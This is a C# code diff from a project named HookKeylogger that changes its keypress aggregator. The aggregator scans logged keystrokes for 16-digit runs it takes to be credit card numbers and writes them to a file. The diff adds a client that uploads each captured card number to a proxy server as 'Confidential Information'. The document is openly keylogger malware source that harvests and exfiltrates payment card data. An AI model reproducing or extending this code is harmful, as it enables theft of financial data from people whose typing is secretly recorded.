@@ -1,11 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using HookKeylogger.Base;
 using System.IO;
 using Google.Protobuf;
+using System.Windows.Forms;
+using HookKeylogger.AggergationServer.Types;
 
 namespace KeypressAggregator
 {
@@ -30,8 +28,10 @@ namespace KeypressAggregator
 
             // Write the information to the stream, goes through each keypress
             StreamWriter o = new StreamWriter(newFile);
+            HookKeylogger.UploadProxy.UploadProxyClient client = new HookKeylogger.UploadProxy.UploadProxyClient();
             foreach (KeyPress ks in kpb.Keys)
             {
+                Console.WriteLine("Processing: " + (Keys)ks.Key);
                 // Looks for a credit card number, ie 16 consecutive digits
                 // A number is between 48 and 57. If there is a match, the count
                 // is incremented and the number is added to string. Otherwise
@@ -56,10 +56,19 @@ namespace KeypressAggregator
                 {
                     o.WriteLine("Credit Card Number: " + creditNum);
                     creditCard = 0;
+                    // Send a Confidential Information message to the proxy server
+                    // Type Credit Card Number CCN
+                    var ci = new CI();
+                    ci.Type = "CCN";
+                    ci.Data = creditNum;
+                    Console.WriteLine("DATA: " + ci.Data);
+                    client.SendCi(ci);
+
                     creditNum = "";
                 }
             }
             o.Close();
+            client.close();
 
         }
 
